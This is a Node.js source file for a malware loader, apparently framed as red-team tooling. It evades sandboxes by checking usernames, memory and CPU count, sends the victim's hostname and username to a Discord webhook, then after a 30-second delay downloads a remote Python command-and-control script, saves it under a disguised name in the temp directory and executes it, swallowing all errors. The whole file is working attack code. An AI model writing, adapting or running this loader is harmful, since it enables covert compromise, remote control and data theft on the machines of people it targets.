const fetch = require('node-fetch');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const CONFIG = {
    WEBHOOK: 'YOUR_DISCORD_WEBHOOK_HERE',
    PYTHON_SCRIPT: 'https://github.com/usocoder/GGPY/raw/main/redteam_c2.py'
};

class JavaScriptLoader {
    constructor() {
        this.sessionId = this.generateSessionId();
    }

    generateSessionId() {
        return Math.random().toString(36).substring(2, 15);
    }

    async checkEnvironment() {
        let indicators = 0;
        const username = os.userInfo().username.toLowerCase();
        const sandboxUsers = ['sandbox', 'virus', 'malware', 'test'];
        if (sandboxUsers.some(user => username.includes(user))) {
            indicators++;
        }

        const memory = os.totalmem();
        if (memory < 2 * 1024 * 1024 * 1024) {
            indicators++;
        }

        const cpus = os.cpus().length;
        if (cpus < 2) {
            indicators++;
        }

        return indicators < 2;
    }

    async sendBeacon(status) {
        try {
            const systemInfo = {
                platform: os.platform(),
                hostname: os.hostname(),
                username: os.userInfo().username,
                sessionId: this.sessionId,
                status: status
            };

            await fetch(CONFIG.WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `Loader - ${status}`,
                    embeds: [{
                        title: "Loader Activity",
                        fields: [
                            { name: "Hostname", value: systemInfo.hostname },
                            { name: "Username", value: systemInfo.username },
                            { name: "Status", value: status }
                        ]
                    }]
                })
            });
        } catch (error) {
        }
    }

    async downloadPythonScript() {
        try {
            const response = await fetch(CONFIG.PYTHON_SCRIPT);
            const scriptContent = await response.text();
            const tempDir = os.tmpdir();
            const scriptPath = path.join(tempDir, 'system_service.py');
            fs.writeFileSync(scriptPath, scriptContent);
            return scriptPath;
        } catch (error) {
            return null;
        }
    }

    executePythonScript(scriptPath) {
        return new Promise((resolve) => {
            const command = `python "${scriptPath}"`;
            exec(command, (error) => {
                resolve();
            });
        });
    }

    async initialize() {
        if (!await this.checkEnvironment()) {
            process.exit(0);
        }

        await this.sendBeacon('initialized');

        setTimeout(async () => {
            const scriptPath = await this.downloadPythonScript();
            if (scriptPath) {
                await this.executePythonScript(scriptPath);
                await this.sendBeacon('payload_executed');
            }
        }, 30000);
    }
}

const loader = new JavaScriptLoader();
loader.initialize();